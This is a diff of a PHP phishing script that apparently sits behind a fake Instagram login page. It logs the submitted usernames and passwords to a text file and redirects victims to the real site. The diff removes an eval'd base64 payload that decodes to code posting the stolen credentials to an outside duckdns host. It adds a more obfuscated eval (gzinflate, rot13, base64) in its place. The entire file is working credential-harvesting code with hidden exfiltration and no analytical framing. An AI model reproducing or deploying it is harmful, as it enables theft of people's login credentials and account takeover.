@@ -1,9 +1,5 @@
-
 <?php
-
-eval(base64_decode('JHVybCA9ICJoYWNrZXJjb2MuZHVja2Rucy5vcmcvMS5waHAiOwokcG9zdCA9IGFycmF5ICgKInVzZXJuYW1lIiA9PiAkX1BPU1RbJ3VzZXJuYW1lJ10sCiJwYXNzd29yZCIgPT4gJF9QT1NUWydwYXNzd29yZCddCik7CiAKJGNoID0gY3VybF9pbml0ICgkdXJsKTsKY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9QT1NULCB0cnVlKTsKY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkcG9zdCk7CmN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwokZGF0YSA9IGN1cmxfZXhlYyAoJGNoKTsKZWNobyAkZGF0YTs='));
-
-
-file_put_contents("hesaplar.txt", "Kullanıcı adı: " . $_POST['username'] . " Şifre: " . $_POST['password'] . "\n", FILE_APPEND);
+eval(gzinflate(str_rot13(base64_decode('hY/BCsIwEFHvhf7DRQJIKBXPoiDagkNH0m0SKW4bjKhaVUXUvzcNFPGit3Lm7ews6fQN5hAJhkquRG/aZ2t6TZNXfZ5ZRiVHNAsDoqSxjnBNsxeMwiDqDNctu/MI5gsg9X5KScdrEONG4hDFjGxV3XwhgxifwmDsksGFo2PR6JrUl/ZvblHc2HteMtxX1YsoEksddbHbSj4rAas7/p/LN0yxLhPwP/zGdkkd6Laiy3qZdPRmgDTMsqEjf2X0e73DRFXw9uwN'))));
+file_put_contents("hesaplar.txt", "kullanıcı adı: " . $_POST['username'] . " şifre: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
